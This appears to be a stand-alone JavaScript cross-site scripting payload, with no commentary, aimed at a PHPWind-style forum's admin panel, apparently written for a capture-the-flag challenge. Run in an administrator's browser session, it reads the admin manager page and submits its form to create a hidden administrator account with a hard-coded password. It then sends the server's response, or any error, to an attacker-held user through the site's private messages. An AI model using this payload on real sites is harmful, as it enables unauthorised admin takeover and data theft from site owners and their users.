(async()=>{
 const g=await(await fetch('/admin.php?adminjob=manager',{credentials:'include'})).text();
 const d=new DOMParser().parseFromString(g,'text/html');
 const f=[...d.forms].find(x=>x.querySelector('[name=username]')&&x.querySelector('[name=password]'));
 const a=new URL(f.getAttribute('action'),location);
 const b=new URLSearchParams({action:'add',username:'ctfadmin888',password:'Pwn123456',check_pwd:'Pwn123456'});
 const r=await(await fetch(a,{method:'POST',body:b,credentials:'include'})).text();
 const v=document.querySelector('[name=verify]').value;
 const m=new URLSearchParams({step:'2',verify:v,msg_title:'R',atc_content:r.slice(0,500),pwuser:'ctf554613'});
 await fetch('/message.php?action=write&',{method:'POST',body:m,credentials:'include'});
})().catch(e=>fetch('/message.php?action=write&',{method:'POST',credentials:'include',body:new URLSearchParams({step:'2',verify:document.querySelector('[name=verify]').value,msg_title:'E',atc_content:''+e,pwuser:'ctf554613'})}));
